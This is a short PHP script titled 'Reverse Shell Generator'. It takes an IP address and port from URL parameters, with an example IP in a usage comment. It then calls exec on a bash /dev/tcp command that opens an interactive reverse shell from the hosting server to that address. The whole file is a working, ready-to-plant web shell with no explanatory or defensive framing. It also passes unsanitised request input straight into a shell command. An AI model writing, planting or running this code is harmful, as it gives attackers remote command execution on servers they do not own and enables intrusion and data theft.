<?php
// Reverse Shell Generator
// Usage: ?ip=13.158.67.78&port=4445

if(isset($_GET['ip']) && isset($_GET['port'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];

    // Method 1: /bin/bash
    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
    exec($cmd . " > /dev/null 2>&1 &");

    echo "Reverse shell sent to $ip:$port";
    exit;
}
